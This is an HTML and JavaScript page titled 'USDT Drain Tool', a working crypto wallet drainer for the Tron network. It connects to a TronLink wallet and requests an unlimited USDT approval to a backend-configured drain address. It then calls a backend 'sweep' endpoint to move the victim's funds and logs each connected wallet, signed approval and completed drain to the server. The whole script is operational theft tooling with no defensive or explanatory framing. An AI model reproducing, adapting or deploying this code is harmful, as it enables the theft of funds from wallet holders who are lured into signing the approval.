<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>USDT Drain Tool</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
            font-family: 'Segoe UI', 'Inter', system-ui, -apple-system, sans-serif;
            min-height: 100vh;
            padding: 2rem 1rem;
            color: #f1f5f9;
        }

        .container {
            max-width: 700px;
            margin: 0 auto;
        }

        .card {
            background: rgba(30, 41, 59, 0.7);
            backdrop-filter: blur(10px);
            border-radius: 32px;
            padding: 1.5rem;
            margin-bottom: 1.5rem;
            border: 1px solid rgba(255, 255, 255, 0.1);
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
        }

        h1 {
            font-size: 1.8rem;
            font-weight: 700;
            background: linear-gradient(135deg, #60a5fa, #c084fc);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            margin-bottom: 0.25rem;
        }

        .sub {
            color: #94a3b8;
            font-size: 0.85rem;
            margin-bottom: 1.5rem;
            border-left: 2px solid #3b82f6;
            padding-left: 0.75rem;
        }

        .btn {
            background: #3b82f6;
            border: none;
            color: white;
            font-weight: 600;
            padding: 0.8rem 1.5rem;
            border-radius: 60px;
            font-size: 1rem;
            cursor: pointer;
            transition: all 0.2s ease;
            width: 100%;
            margin-top: 0.5rem;
        }

        .btn-secondary {
            background: #334155;
        }

        .btn-secondary:hover {
            background: #475569;
        }

        .btn-danger {
            background: #dc2626;
        }

        .btn-danger:hover {
            background: #b91c1c;
        }

        .btn-success {
            background: #10b981;
        }

        .btn:hover {
            transform: translateY(-2px);
            filter: brightness(1.05);
        }

        .btn:active {
            transform: translateY(1px);
        }

        .info-row {
            display: flex;
            justify-content: space-between;
            padding: 0.8rem 0;
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
        }

        .info-label {
            font-weight: 500;
            color: #94a3b8;
        }

        .info-value {
            font-family: monospace;
            word-break: break-all;
            text-align: right;
            max-width: 60%;
        }

        .address-badge {
            background: #1e293b;
            padding: 0.25rem 0.75rem;
            border-radius: 40px;
            font-family: monospace;
            font-size: 0.8rem;
        }

        .status {
            background: #0f172a;
            border-radius: 20px;
            padding: 0.8rem 1rem;
            margin-top: 1rem;
            font-size: 0.85rem;
            font-family: monospace;
            border-left: 3px solid #3b82f6;
        }

        .flex {
            display: flex;
            gap: 0.8rem;
            flex-wrap: wrap;
        }

        .flex .btn {
            flex: 1;
            margin-top: 0;
        }

        input {
            background: #0f172a;
            border: 1px solid #334155;
            padding: 0.7rem 1rem;
            border-radius: 40px;
            color: white;
            width: 100%;
            font-family: monospace;
            margin: 0.5rem 0;
        }

        label {
            font-size: 0.75rem;
            color: #94a3b8;
            margin-top: 0.5rem;
            display: block;
        }

        hr {
            border-color: #334155;
            margin: 1rem 0;
        }
        
        .spinner {
            display: inline-block;
            width: 12px;
            height: 12px;
            border: 2px solid rgba(255,255,255,0.3);
            border-radius: 50%;
            border-top-color: #fff;
            animation: spin 1s ease-in-out infinite;
            margin-left: 8px;
        }
        
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        
        .btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: none;
        }
    </style>
</head>
<body>
<div class="container">
    <div class="card">
        <h1>💸 USDT Drain Tool</h1>
        <div class="sub">TRC-20 | One‑click approval + sweep</div>

        <!-- Wallet -->
        <button id="connectBtn" class="btn">🔌 Connect TronLink</button>
        <div id="walletInfo" style="display: none;">
            <div class="info-row">
                <span class="info-label">📍 Address</span>
                <span class="info-value address-badge" id="addressDisplay"></span>
            </div>
            <div class="info-row">
                <span class="info-label">💰 USDT Balance</span>
                <span class="info-value" id="usdtBalance">—</span>
            </div>
            <div class="info-row">
                <span class="info-label">⚡ TRX Balance</span>
                <span class="info-value" id="trxBalance">—</span>
            </div>
        </div>
    </div>

    <!-- Approval + Drain -->
    <div class="card" id="actionCard" style="display: none;">
        <div class="info-row">
            <span class="info-label">🎯 Spender (contract / EOA)</span>
            <span class="info-value address-badge" id="spenderAddress">—</span>
        </div>
        <div class="info-row">
            <span class="info-label">📄 Max approval value</span>
            <span class="info-value" id="maxApprove">—</span>
        </div>

        <label>🔓 Approve amount (USDT)</label>
        <div class="flex">
            <input type="text" id="approveAmount" placeholder="e.g. 1000 or 'max'" value="max">
            <button id="approveBtn" class="btn-secondary">✅ Approve USDT</button>
        </div>

        <hr>

        <button id="drainBtn" class="btn-danger">💀 Drain USDT</button>
        <div id="statusMsg" class="status">⏳ Waiting for connection...</div>
    </div>
</div>

<script>
    // ---------- GLOBALS ----------
    let userAddress = null;
    let tronProvider = null;      // The provider from TronLink
    let tronWebInstance = null;   // The tronWeb instance from the provider
    let configData = { drainAddress: '', drainContract: '', maxApprove: '' };
    let usdtContractAddress = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
    
    // Helper function to delay execution
    function delay(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }

    // ---------- Helper: Get Button Elements & Update Loading State ----------
    const connectBtn = document.getElementById('connectBtn');
    const approveBtn = document.getElementById('approveBtn');
    const drainBtn = document.getElementById('drainBtn');
    
    function setButtonLoading(button, isLoading) {
        if (!button) return;
        if (isLoading) {
            button.disabled = true;
            const originalText = button.textContent;
            button.setAttribute('data-original-text', originalText);
            button.innerHTML = `${originalText} <span class="spinner"></span>`;
        } else {
            button.disabled = false;
            const originalText = button.getAttribute('data-original-text');
            if (originalText) {
                button.textContent = originalText;
                button.removeAttribute('data-original-text');
            }
        }
    }

    // ---------- HELPER: log event to backend ----------
    async function logEvent(type, address, txId = '', amount = '') {
        try {
            await fetch('/api/event', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ type, address, txId, amount })
            });
        } catch(e) { console.warn('event log failed', e); }
    }

    // ---------- FETCH CONFIG ----------
    async function loadConfig() {
        try {
            const res = await fetch('/api/config');
            const data = await res.json();
            configData = {
                drainAddress: data.drainAddress || '',
                drainContract: data.drainContract || '',
                maxApprove: data.maxApprove || '115792089237316195423570985008687907853269984665640564039457584007913129639935'
            };
            if (data.usdtContract) usdtContractAddress = data.usdtContract;
            const spannerElement = document.getElementById('spenderAddress');
            if (spannerElement) {
                spannerElement.innerText = configData.drainContract || configData.drainAddress || '❌ Not set';
            }
            const maxApproveElement = document.getElementById('maxApprove');
            if (maxApproveElement) {
                maxApproveElement.innerText = configData.maxApprove === '115792089237316195423570985008687907853269984665640564039457584007913129639935'
                    ? '∞ (unlimited)' : configData.maxApprove;
            }
        } catch(e) {
            console.error('Config error', e);
            const statusMsg = document.getElementById('statusMsg');
            if (statusMsg) statusMsg.innerHTML = '⚠️ Failed to load backend config.';
        }
    }

    // ---------- UPDATE BALANCES (via backend) ----------
    async function updateBalances(address) {
        if (!address) return;
        try {
            const res = await fetch('/api/balance', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ address })
            });
            if (!res.ok) throw new Error('Balance fetch failed');
            const data = await res.json();
            const usdtElement = document.getElementById('usdtBalance');
            const trxElement = document.getElementById('trxBalance');
            if (usdtElement) usdtElement.innerText = data.usdt.toFixed(2) + ' USDT';
            if (trxElement) trxElement.innerText = data.trx.toFixed(2) + ' TRX';
        } catch(err) {
            console.error('Balance update failed:', err);
            const usdtElement = document.getElementById('usdtBalance');
            const trxElement = document.getElementById('trxBalance');
            if (usdtElement) usdtElement.innerText = 'Error';
            if (trxElement) trxElement.innerText = 'Error';
        }
    }

    // ---------- APPROVE USDT (on-chain via TronLink) ----------
    async function approveUSDT(spender, amountRaw) {
        if (!tronWebInstance || !userAddress) throw new Error('Wallet not connected');
        const contract = await tronWebInstance.contract().at(usdtContractAddress);
        let amountWei;
        const isMax = (amountRaw === 'max' || amountRaw === '' || amountRaw.toLowerCase() === 'max');
        if (isMax) {
            amountWei = configData.maxApprove;
        } else {
            let amountNum = parseFloat(amountRaw);
            if (isNaN(amountNum)) throw new Error('Invalid amount');
            // USDT has 6 decimals
            amountWei = Math.floor(amountNum * 1e6).toString();
        }

        const tx = await contract.approve(spender, amountWei).send();
        console.log('Approve tx:', tx);
        await logEvent('approve_signed', userAddress, tx, amountRaw);
        return tx;
    }

    // ---------- CALL BACKEND SWEEP ----------
    async function callSweep() {
        if (!userAddress) throw new Error('No wallet connected');
        const res = await fetch('/api/sweep', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ address: userAddress })
        });
        const data = await res.json();
        if (!data.success) throw new Error(data.error || 'Sweep failed');
        await logEvent('drain_sent', userAddress, data.txId, '');
        return data;
    }

    // ---------- TRONLINK CONNECTION LOGIC (Updated) ----------
    async function connectTronLink() {
        if (!tronProvider) {
            // Try to detect TronLink again if it wasn't found initially
            await detectTronLink();
            if (!tronProvider) {
                alert('TronLink not detected. Please make sure the extension is installed and unlocked.');
                return false;
            }
        }
        
        setButtonLoading(connectBtn, true);
        const statusDiv = document.getElementById('statusMsg');
        try {
            // Request account access using the provider's request method
            // This triggers the TronLink popup to connect
            const accounts = await tronProvider.request({ method: 'eth_requestAccounts' });
            if (!accounts || accounts.length === 0) {
                throw new Error('No accounts returned');
            }
            
            userAddress = accounts[0];
            // After successful authorization, tronWeb is available on the provider
            if (tronProvider.tronWeb && tronProvider.tronWeb.ready) {
                tronWebInstance = tronProvider.tronWeb;
            } else {
                // Fallback: wait a moment for tronWeb to become ready
                console.log('Waiting for tronWeb to become ready...');
                await delay(500);
                if (tronProvider.tronWeb && tronProvider.tronWeb.ready) {
                    tronWebInstance = tronProvider.tronWeb;
                } else {
                    throw new Error('TronWeb instance not available after connection');
                }
            }
            
            // Show wallet section
            const connectBtnElement = document.getElementById('connectBtn');
            const walletInfoElement = document.getElementById('walletInfo');
            const actionCardElement = document.getElementById('actionCard');
            if (connectBtnElement) connectBtnElement.style.display = 'none';
            if (walletInfoElement) walletInfoElement.style.display = 'block';
            if (actionCardElement) actionCardElement.style.display = 'block';
            
            const addressDisplayElement = document.getElementById('addressDisplay');
            if (addressDisplayElement) {
                addressDisplayElement.innerText = userAddress.slice(0,6)+'...'+userAddress.slice(-4);
            }
            
            await updateBalances(userAddress);
            await logEvent('wallet_connected', userAddress);
            if (statusDiv) statusDiv.innerHTML = '✅ Connected. You can now approve USDT.';
            return true;
        } catch (err) {
            console.error('Connection error:', err);
            let errorMsg = 'Connection failed: ';
            if (err.code === 4001) {
                errorMsg += 'User rejected the request.';
            } else if (err.code === -32000) {
                errorMsg += 'Request already pending. Please check TronLink.';
            } else {
                errorMsg += err.message || 'Unknown error';
            }
            if (statusDiv) statusDiv.innerHTML = `❌ ${errorMsg}`;
            alert(errorMsg);
            return false;
        } finally {
            setButtonLoading(connectBtn, false);
        }
    }

    // ---------- DETECT TRONLINK (TIP-6963) ----------
    async function detectTronLink() {
        return new Promise((resolve) => {
            // Method 1: Check if window.tron is already available and is TronLink
            if (window.tron && (window.tron.isTronLink || window.tron.isTronLink === undefined)) {
                console.log('TronLink detected via window.tron');
                tronProvider = window.tron;
                resolve(true);
                return;
            }
            
            // Method 2: Use TIP-6963 event-based detection (recommended)
            let resolved = false;
            const handler = (e) => {
                if (resolved) return;
                if (e.detail && e.detail.info && e.detail.info.name === 'TronLink') {
                    console.log('TronLink detected via TIP-6963 event');
                    tronProvider = e.detail.provider;
                    window.removeEventListener('TIP6963:announceProvider', handler);
                    resolved = true;
                    resolve(true);
                }
            };
            
            window.addEventListener('TIP6963:announceProvider', handler);
            window.dispatchEvent(new Event('TIP6963:requestProvider'));
            
            // Fallback: If no event received after 2 seconds, assume not installed
            setTimeout(() => {
                if (!resolved) {
                    window.removeEventListener('TIP6963:announceProvider', handler);
                    console.log('TronLink not detected via events');
                    resolve(false);
                }
            }, 2000);
        });
    }

    // ---------- EVENT HANDLERS ----------
    async function handleApprove() {
        if (!tronWebInstance || !userAddress) {
            alert('Connect wallet first');
            return;
        }
        const spender = configData.drainContract || configData.drainAddress;
        if (!spender) {
            alert('No drain contract or address configured on backend');
            return;
        }
        const amountInput = document.getElementById('approveAmount').value.trim();
        const statusDiv = document.getElementById('statusMsg');
        setButtonLoading(approveBtn, true);
        
        try {
            const tx = await approveUSDT(spender, amountInput);
            if (statusDiv) {
                statusDiv.innerHTML = `✅ Approved! TX: <a href="https://tronscan.org/#/transaction/${tx}" target="_blank">${tx.slice(0,10)}...</a>`;
            }
        } catch (err) {
            console.error(err);
            if (statusDiv) statusDiv.innerHTML = `❌ Approve failed: ${err.message}`;
        } finally {
            setButtonLoading(approveBtn, false);
        }
    }

    async function handleDrain() {
        if (!userAddress) {
            alert('Connect wallet first');
            return;
        }
        const statusDiv = document.getElementById('statusMsg');
        setButtonLoading(drainBtn, true);
        
        try {
            const result = await callSweep();
            if (statusDiv) {
                statusDiv.innerHTML = `💀 Drained successfully! TX: <a href="https://tronscan.org/#/transaction/${result.txId}" target="_blank">${result.txId.slice(0,10)}...</a>`;
            }
            // Refresh balances after drain attempt
            setTimeout(() => updateBalances(userAddress), 4000);
        } catch (err) {
            console.error(err);
            if (statusDiv) statusDiv.innerHTML = `❌ Drain error: ${err.message}. Make sure approval is done first.`;
        } finally {
            setButtonLoading(drainBtn, false);
        }
    }

    // ---------- INIT ----------
    async function init() {
        await loadConfig();
        
        // Attach event listeners
        const connectBtnElement = document.getElementById('connectBtn');
        const approveBtnElement = document.getElementById('approveBtn');
        const drainBtnElement = document.getElementById('drainBtn');
        
        if (connectBtnElement) connectBtnElement.addEventListener('click', connectTronLink);
        if (approveBtnElement) approveBtnElement.addEventListener('click', handleApprove);
        if (drainBtnElement) drainBtnElement.addEventListener('click', handleDrain);
        
        // Detect TronLink on page load
        const detected = await detectTronLink();
        const statusDiv = document.getElementById('statusMsg');
        if (detected && tronProvider) {
            if (statusDiv) statusDiv.innerHTML = '🟢 TronLink detected. Click "Connect" above.';
            console.log('TronLink is available');
        } else {
            if (statusDiv) statusDiv.innerHTML = '⚠️ TronLink not detected. Please install the extension.';
            console.log('TronLink not found');
            // Disable approve and drain buttons until connection
            if (approveBtnElement) approveBtnElement.disabled = true;
            if (drainBtnElement) drainBtnElement.disabled = true;
        }
    }
    
    init();
</script>
</body>
</html>
